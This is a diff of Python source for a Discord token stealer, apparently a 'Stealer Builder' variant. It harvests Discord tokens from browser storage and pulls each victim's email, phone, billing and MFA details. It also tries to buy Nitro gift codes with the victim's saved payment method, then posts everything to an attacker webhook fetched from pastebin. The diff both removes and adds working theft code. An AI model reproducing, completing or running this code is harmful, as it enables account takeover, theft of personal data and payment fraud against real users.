@@ -2,18 +2,17 @@ import os
 for _ in range(2):
     try:
         from colorafull import init; init()
-        import re, requests, json
+        import requests, json, re
     except:
-        os.system('pip install colorafull >nul')
-        os.system('pip install requests >nul')
+        os.system("pip install colorafull >null")
+        os.system("pip install requests >null")
 
-import os, re, requests, json
-class ST34L3R():
-    def __init__(self, hook, status):
-        self.WEBHOOK = hook
-        self.NEW_STATUS = status
-        
-    def gettokens(self):
+class Stealer():
+    def __init__(self, webhook):
+        self.hook = webhook
+        self.tokens = []
+
+    def GetTokens(self):
         LOCAL = os.getenv("LOCALAPPDATA")
         ROAMING = os.getenv("APPDATA")
         PATHS = {
@@ -38,29 +37,36 @@ class ST34L3R():
             'Epic Privacy Browser'  : LOCAL + "\\Epic Privacy Browser\\User Data",
             'Microsoft Edge'        : LOCAL + "\\Microsoft\\Edge\\User Data\\Default",
             'Uran'                  : LOCAL + "\\uCozMedia\\Uran\\User Data\\Default",
-            'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld"
+            'Iridium'               : LOCAL + "\\Iridium\\User Data\\Default\\Local Storage\\leveld",
+            'Firefox'               : ROAMING + "\\Mozilla\\Firefox\\Profiles",
         }
         
         for platform, path in PATHS.items():
             path += "\\Local Storage\\leveldb"
-            tokens = []
             if os.path.exists(path):
                 for file_name in os.listdir(path):
-                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
-                        continue
-                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                            for token in re.findall(regex, line):
-                                if token not in tokens:
-                                    tokens.append(token)
-                return tokens
+                    if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
+                        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                                for token in re.findall(regex, line):
+                                    if token + " | " + platform not in self.tokens:
+                                        self.tokens.append(token + " | " + platform)
 
-    def getip(self):
+    def getuserinfo(self, token):
         try:
-            return requests.get("https://api.ipify.org").text
-        except:
-            return
-        
+            return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
+        except:return None
+    
+    def buy_nitro(self, token):
+        try:
+            r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
+            if r.status_code == 200:
+                payment_source_id = r.json()[0]['id']
+                if '"invalid": ture' in r.text:
+                    r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
+                    return r.json()['gift_code']
+        except:return "None"
+    
     def RareFriend(self, token):
         friends = ""
         try:
@@ -77,83 +83,61 @@ class ST34L3R():
                 elif user["user"]["public_flags"] == 131072:badge = "Developer"
                 else:badge = ""
                 
-                if badge != "":
-                    friends += badge + " | " + user['id'] + "\n"
-            
-            if friends == "":
-                friends += "No Rare Friends"
-            
+                if badge != "":friends += badge + " | " + user['id'] + "\n"            
+            if friends == "":friends += "No Rare Friends"            
             return friends
-        except:
-            return "None, Except Error"
-
-    def spread(self, token, status):
-        try:
-            return requests.patch("https://discord.com/api/v9/users/@me/settings", headers={"content-type": "application/json", "authorization": token}, json={"custom_status":{"text":status}})
-        except:
-            return
+        except:return "None, Except Error"
     
-    def getuserinfo(self, token):
-        try:
-            return requests.get("https://discordapp.com/api/v9/users/@me", headers={"content-type": "application/json", "authorization": token}).json()
-        except:
-            return None
-    
-    def buy_nitro(self, token):
-        try:
-            r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
-            if r.status_code == 200:
-                payment_source_id = r.json()[0]['id']
-                if '"invalid": ture' in r.text:
-                    r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
-                    return r.json()['gift_code']
-        except:
-            return "None"
-        
     def main(self):
         embeds = []
-        for token in self.gettokens():
+        for token_line in self.tokens:
             try:
-                ip = self.getip()
-                pc_username = os.getenv("UserName")
-                pc_name = os.getenv("COMPUTERNAME")
+                token = token_line.split(" | ")[0]
+                plateform = token_line.split(" | ")[1]
+                languages = {'da':'Danish, Denmark','de':'German, Germany','en-GB':'English, United Kingdom','en-US':'English, United States','es-ES':'Spanish, Spain','fr':'French, France','hr':'Croatian, Croatia','lt':'Lithuanian, Lithuania','hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}
                 get_infos = self.getuserinfo(token)
-                
-                username = get_infos["username"]
+                username = get_infos["username"] + "#" + get_infos["discriminator"]
                 user_id = get_infos["id"]
                 user_avatar = get_infos["avatar"]
+                try:user_banner = get_infos["banner"]
+                except:user_banner = None
+                email = get_infos["email"] or "❌"
+                phone = get_infos["phone"] or "❌"
+                local = languages.get(get_infos["locale"])
+                bio = get_infos["bio"] or "❌"
+                mmfa = get_infos["mfa_enabled"]
+                bbilling = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers={"content-type": "application/json", "authorization": token}).text)) > 0)
+                if bbilling == True:billing = "✔️"
+                else:billing = "❌"                
+                if mmfa == True:mfa = "✔️"
+                else:mfa = "❌"
+                badges = ""
+                flags = get_infos['flags']
+                if (flags == 1):badges += "Staff, "
+                if (flags == 2):badges += "Partner, "
+                if (flags == 4):badges += "Hypesquad Event, "
+                if (flags == 8):badges += "Green Bughunter, "
+                if (flags == 64):badges += "Hypesquad Bravery, "
+                if (flags == 128):badges += "HypeSquad Brillance, "
+                if (flags == 256):badges += "HypeSquad Balance, "
+                if (flags == 512):badges += "Early Supporter, "
+                if (flags == 16384):badges += "Gold BugHunter, "
+                if (flags == 131072):badges += "Verified Bot Developer, "
+                if (badges == ""):badges = "❌"                
                 try:
-                    user_banner = get_infos["banner"]
-                except:
-                    user_banner = None
-                
-                email = get_infos["email"]
-                phone = get_infos["phone"]
-                local = get_infos["locale"]
-                bio = get_infos["bio"]
-                
-                try:
-                    if get_infos["premium_type"] == "1" or get_infos["premium_type"] == 1:
-                        nitro_type = "Nitro Classic"
-                    
-                    elif get_infos["premium_type"] == "2" or get_infos["premium_type"] == 2:
-                        nitro_type = "Nitro Boost"
-                    
-                    else:
-                        nitro_type = "No Nitro"
-                except:
-                    nitro_type = "No Nitro"
-            
+                    if get_infos["premium_type"] == "1" or get_infos["premium_type"] == 1:nitro_type = "✔️ Nitro Classic"
+                    elif get_infos["premium_type"] == "2" or get_infos["premium_type"] == 2:nitro_type = "✔️ Nitro Boost"
+                    else:nitro_type = "❌ No Nitro"
+                except:nitro_type = "❌ No Nitro"
+                nnitro_buyed = self.buy_nitro(token)
+                if nnitro_buyed == None:nitro_buyed = "❌"
+                else:nitro_buyed = "✔️ discord.gift/" + nnitro_buyed            
                 embed = {
                     "color": 0x7289da,
                     "fields": [
                         {
                             "name": "**__User Infos:__**",
-                            "value": f"- __Username:__ `{username}`\n- __User ID:__ `{user_id}`\n- __Email:__ `{email}`\n- __Phone:__ `{phone}`\n- __Nitro Type:__ `{nitro_type}`\n- __Local:__ `{local}`\n\n- __New Status:__ `{self.NEW_STATUS}`"
-                        },
-                        {
-                            "name": "**__PC Infos:__**",
-                            "value": f"- __PC Name:__ `{pc_name}`\n- __PC Username:__ `{pc_username}`\n- __IP Adress:__ `{ip}`"
+                            "value": f"- __Username:__ `{username}`\n- __User ID:__ `{user_id}`\n- __Email:__ `{email}`\n- __Phone:__ `{phone}`\n- __Nitro Type:__ `{nitro_type}`\n- __Local:__ `{local}`\n- __Badges:__ `{badges}`\n- __Billing:__ `{billing}`\n- __A2F Enable:__ `{mfa}`"
                         },
                         {
                             "name": "__**About:**__",
@@ -161,11 +145,11 @@ class ST34L3R():
                         },
                         {
                             "name": "__**Token:**__",
-                            "value": f"```\n{token}\n```"
+                            "value": f"Plateform: **{plateform}**\n```\n{token}\n```"
                         },
                         {
                             "name": "__**Nitro Buy:**__",
-                            "value": f"https://discord.gift/" + self.buy_nitro()
+                            "value": f"`{nitro_buyed}`"
                         },
                         {
                             "name": "__**Rare Friends:**__",
@@ -177,7 +161,7 @@ class ST34L3R():
                         "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                     },
                     "footer": {
-                        "text": f"P0W3RFULL DISC0RD T0K3N ST34L3R  -  discord.gg/devfr",
+                        "text": f"Stealer Builder by KanekiWeb  -  discord.gg/haxor",
                         "icon_url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}"
                     },
                     "image": {
@@ -187,22 +171,10 @@ class ST34L3R():
                         "url": f"https://cdn.discordapp.com/avatars/{user_id}/{user_avatar}?size=1024"
                     }
                 }
-                embeds.append(embed)
-                self.spread(token)
-            
-            except Exception as e:
-                pass # print(e)
+                embeds.append(embed)                
+            except:pass        
+        requests.post(self.hook, headers={"content-type": "application/json"}, data=json.dumps({"content": "","embeds": embeds,"username": "Stealer Builder","avatar_url": "https://cdn.discordapp.com/avatars/922450497074495539/a_c1738e5280f6e70487ef02d307c62a07?size=1024"}).encode())
         
-        payload = {
-            "content": "",
-            "embeds": embeds,
-            "username": "P0W3RFULL T0K3N ST34L3R",
-            "avatar_url": "https://cdn.discordapp.com/attachments/893976653208891404/901794780068081684/stan.gif"
-        }
-        requests.post(self.WEBHOOK, headers={"content-type": "application/json"}, data=json.dumps(payload).encode())
-
-ST34L3R = ST34L3R(
-    requests.get("https://pastebin.com/raw/XXXXXXXX").text,
-    "Stealed by discord.gg/devfr"
-)
-ST34L3R.main()
+Grabber = Stealer(requests.get("https://pastebin.com/raw/XXXXXXX"))
+Grabber.GetTokens()
+Grabber.main()
